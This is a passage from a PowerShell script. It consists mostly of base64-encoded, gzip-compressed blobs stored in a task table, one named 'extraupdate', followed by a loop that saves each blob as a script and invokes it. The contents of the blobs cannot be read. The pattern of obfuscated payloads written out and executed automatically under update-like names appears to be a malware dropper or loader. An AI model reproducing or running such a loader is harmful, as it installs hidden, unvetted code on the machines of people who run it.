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"
    "extraupdate" = "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"

        }

        writedbg "Main - "
        foreach ($key in $tasks.Keys)
        {
            $task = $key
            $body = $tasks.$key
            writedbg "Main - $task"
            Save-Script -taskName $task -Body $body
            Invoke-Script -taskName $task
        }
    }
}

Main

if ($globalDebug)
{
    Start-Sleep -Seconds 100
}